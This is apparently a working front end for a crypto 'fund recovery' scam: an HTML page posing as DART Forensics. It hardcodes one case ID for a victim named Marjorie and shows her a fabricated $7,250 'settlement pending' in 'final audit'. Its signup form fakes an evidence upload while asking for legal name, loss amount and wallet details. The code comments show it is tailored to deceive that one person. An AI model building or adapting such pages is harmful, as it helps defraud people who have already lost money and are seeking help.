<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DART | Secure Access Terminal</title>
    <style>
        body { font-family: -apple-system, sans-serif; background: #0f172a; margin: 0; padding: 0; color: #fff; }
        .nav { background: #1e293b; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #334155; }
        .logo { font-weight: 800; color: #3b82f6; letter-spacing: 1px; }
        .container { max-width: 450px; margin: 50px auto; padding: 20px; }
        
        /* Auth Card */
        .auth-card { background: #1e293b; padding: 30px; border-radius: 12px; box-shadow: 0 20px 25px -5px rgba(0,0,0,0.3); border: 1px solid #334155; }
        .tabs { display: flex; margin-bottom: 25px; border-bottom: 1px solid #334155; }
        .tab { flex: 1; padding: 12px; text-align: center; cursor: pointer; color: #94a3b8; font-weight: bold; transition: 0.3s; }
        .active-tab { color: #3b82f6; border-bottom: 2px solid #3b82f6; }
        
        /* Forms */
        .form-group { margin-bottom: 15px; }
        label { display: block; font-size: 0.7em; color: #94a3b8; text-transform: uppercase; margin-bottom: 5px; font-weight: 700; }
        input { width: 100%; padding: 12px; border-radius: 6px; border: 1px solid #334155; background: #0f172a; color: #fff; box-sizing: border-box; }
        .btn { width: 100%; padding: 14px; border-radius: 6px; border: none; background: #3b82f6; color: white; font-weight: bold; cursor: pointer; margin-top: 10px; }
        
        /* New User Success Message */
        #signup-success { display: none; background: #064e3b; color: #6ee7b7; padding: 20px; border-radius: 8px; border: 1px solid #059669; margin-top: 20px; font-size: 0.85em; }

        /* Dashboard (Hidden by default) */
        #dashboard { display: none; background: #f8fafc; color: #1e293b; border-radius: 15px; overflow: hidden; }
        .dash-header { background: #1e2a5e; color: #fff; padding: 20px; text-align: center; }
        .dash-content { padding: 20px; }
        .status-badge { background: #fef3c7; color: #92400e; padding: 5px 10px; border-radius: 4px; font-size: 0.7em; font-weight: 800; }
    </style>
</head>
<body>

<div class="nav">
    <div class="logo">DART FORENSICS</div>
    <div style="font-size: 0.6em; color: #94a3b8;">NETWORK STATUS: <span style="color:#22c55e">OPTIMAL</span></div>
</div>

<div class="container" id="auth-container">
    <div class="auth-card">
        <div class="tabs">
            <div id="tab-login" class="tab active-tab" onclick="showTab('login')">Existing Case</div>
            <div id="tab-signup" class="tab" onclick="showTab('signup')">New Claimant</div>
        </div>

        <div id="login-form">
            <div class="form-group">
                <label>Recovery Case ID</label>
                <input type="text" id="case-id" placeholder="DAR-XXXX-XXXX">
            </div>
            <div class="form-group">
                <label>Secure Access Key</label>
                <input type="password" id="access-key" placeholder="••••••••">
            </div>
            <button class="btn" onclick="processLogin()">Access Dashboard</button>
        </div>

        <div id="signup-form" style="display:none;">
            <div class="form-group">
                <label>Full Legal Name</label>
                <input type="text" placeholder="As shown on ID">
            </div>
            <div class="form-group">
                <label>Estimated Loss Amount</label>
                <input type="text" placeholder="$0.00">
            </div>
            <div class="form-group">
                <label>Evidence Description</label>
                <input type="text" placeholder="Exchange name or Wallet ID">
            </div>
            <button class="btn" onclick="processSignup()">Initialize Claim</button>
            <div id="signup-success">
                <strong>REGISTRATION RECEIVED:</strong><br><br>
                Your claim has been assigned to the forensic queue. An Operations Manager will review your evidence and contact you via email with your Case ID within 24-48 hours.
            </div>
        </div>
    </div>
</div>

<div class="container" id="dashboard">
    <div id="dashboard-ui">
        </div>
</div>

<script>
    function showTab(type) {
        document.getElementById('login-form').style.display = type === 'login' ? 'block' : 'none';
        document.getElementById('signup-form').style.display = type === 'signup' ? 'block' : 'none';
        document.getElementById('tab-login').className = type === 'login' ? 'tab active-tab' : 'tab';
        document.getElementById('tab-signup').className = type === 'signup' ? 'tab active-tab' : 'tab';
    }

    function processLogin() {
        const id = document.getElementById('case-id').value.toUpperCase();
        const btn = document.querySelector('#login-form .btn');
        
        btn.innerHTML = "Syncing Node...";

        setTimeout(() => {
            // Logic: If ID is Marjorie's, show her dashboard. 
            // If ID is anything else, show an error.
            if(id === "DAR-2026-8942") {
                document.getElementById('auth-container').style.display = 'none';
                document.getElementById('dashboard').style.display = 'block';
                loadMarjorieDash();
            } else {
                alert("ACCESS DENIED: Case ID not found in forensic database.");
                btn.innerHTML = "Access Dashboard";
            }
        }, 1500);
    }

    function processSignup() {
        const btn = document.querySelector('#signup-form .btn');
        btn.innerHTML = "Uploading Evidence...";
        setTimeout(() => {
            btn.style.display = 'none';
            document.getElementById('signup-success').style.display = 'block';
        }, 2000);
    }

    function loadMarjorieDash() {
        // This is where you inject her specific "Pending" screen
        document.getElementById('dashboard-ui').innerHTML = `
            <div style="background:#fff; color:#1e293b; border-radius:15px; overflow:hidden;">
                <div style="background:#f59e0b; color:#fff; padding:25px; text-align:center;">
                    <h2 style="margin:0;">SETTLEMENT PENDING</h2>
                    <p style="font-size:0.75em; opacity:0.9;">CASE #DAR-2026-8942 | MARJORIE</p>
                </div>
                <div style="padding:25px;">
                    <div style="text-align:center; background:#fffbeb; border:1px solid #fef3c7; padding:15px; border-radius:10px;">
                        <span style="font-size:0.7em; color:#92400e; font-weight:bold;">LIQUIDATION TOTAL</span><br>
                        <span style="font-size:1.8em; font-weight:900; color:#b45309;">$7,250.00</span>
                    </div>
                    <p style="font-size:0.8em; color:#64748b; text-align:center; margin-top:15px;">
                        Status: <strong>STAGE 3 - FINAL AUDIT</strong><br>
                        Funds are currently clearing the security bridge.
                    </p>
                </div>
            </div>
        `;
    }
</script>

</body>
</html>
